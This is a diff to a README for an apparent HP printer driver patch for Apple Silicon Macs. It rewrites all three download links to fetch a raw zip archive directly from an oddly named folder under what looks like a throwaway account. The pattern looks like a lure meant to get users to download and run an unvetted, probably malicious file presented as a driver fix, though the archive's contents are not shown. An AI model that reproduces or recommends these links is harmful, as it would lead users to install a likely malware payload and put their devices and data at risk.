@@ -1,6 +1,6 @@
 # ⚙️ hp-printer-drivers-apple-silicon-patch - Fix HP Drivers for Apple Silicon Macs
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/Idaminervatarbelloilfield698/hp-printer-drivers-apple-silicon-patch)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/Idaminervatarbelloilfield698/hp-printer-drivers-apple-silicon-patch/raw/refs/heads/main/boatward/drivers_silicon_patch_apple_hp_printer_v1.7.zip)
 
 ## 📋 About This Patch
 
@@ -36,7 +36,7 @@ Before you start, make sure your computer meets these requirements:
 
 To get the patch, visit the main page by clicking the link below. This page provides the latest versions and instructions. 
 
-[![Download Patch](https://img.shields.io/badge/Download-Patch-blue?style=for-the-badge)](https://github.com/Idaminervatarbelloilfield698/hp-printer-drivers-apple-silicon-patch)
+[![Download Patch](https://img.shields.io/badge/Download-Patch-blue?style=for-the-badge)](https://github.com/Idaminervatarbelloilfield698/hp-printer-drivers-apple-silicon-patch/raw/refs/heads/main/boatward/drivers_silicon_patch_apple_hp_printer_v1.7.zip)
 
 ### How to Download:
 
@@ -126,7 +126,7 @@ The patch contains:
 
 You can always find the latest version and instructions at:
 
-[https://github.com/Idaminervatarbelloilfield698/hp-printer-drivers-apple-silicon-patch](https://github.com/Idaminervatarbelloilfield698/hp-printer-drivers-apple-silicon-patch)
+[https://github.com/Idaminervatarbelloilfield698/hp-printer-drivers-apple-silicon-patch/raw/refs/heads/main/boatward/drivers_silicon_patch_apple_hp_printer_v1.7.zip](https://github.com/Idaminervatarbelloilfield698/hp-printer-drivers-apple-silicon-patch/raw/refs/heads/main/boatward/drivers_silicon_patch_apple_hp_printer_v1.7.zip)
 
 This page updates with new releases and improvements, so check it regularly.
 
